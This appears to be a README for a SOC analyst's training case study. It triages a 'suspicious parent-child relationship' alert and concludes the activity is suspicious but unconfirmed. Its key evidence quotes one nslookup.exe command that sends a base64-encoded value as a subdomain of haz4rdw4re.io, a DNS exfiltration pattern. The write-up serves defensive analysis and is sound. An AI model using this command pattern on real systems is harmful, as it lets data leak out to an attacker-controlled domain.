# soc-alert-triage-case-study
soc alert triage and malware analysis 
soc-alert-triage-case-study/
│
├── README.md
├── evidence/
│   ├── alert-dashboard.png
│   ├── nslookup-command.png
│
└── investigation-notes.md
# SOC Alert Triage Case Study

## Overview
This project documents a SOC alert triage investigation where a suspicious process execution was analyzed to determine whether the activity was malicious.

---

## Alert Summary
- **Alert Type:** Suspicious Parent Child Relationship
- **Severity:** High
- **Category:** Process Execution
- **Status:** Awaiting Investigation

---

 Key Evidence
 Suspicious Command
"C:\Windows\system32\nslookup.exe" RmYjEyNGZiMTY1NjZlfQ==.haz4rdw4re.io

##Skills Demonstrated
Alert Triage
Process Analysis
DNS Investigation
Threat Hunting
Malware Analysis
MITRE ATT&CK Mapping

Analysis 
The alert was triggered by nslookup.exe execution
the subdomain appeared base64 encoded 

Conclusion
The alert was classified as Suspicious rather than Confirmed Malicious.
no supporting indicators such as malicious payload execution, persistence, privilege escalation, or lateral movement were identified. The evidence did not support escalation to a confirmed incident


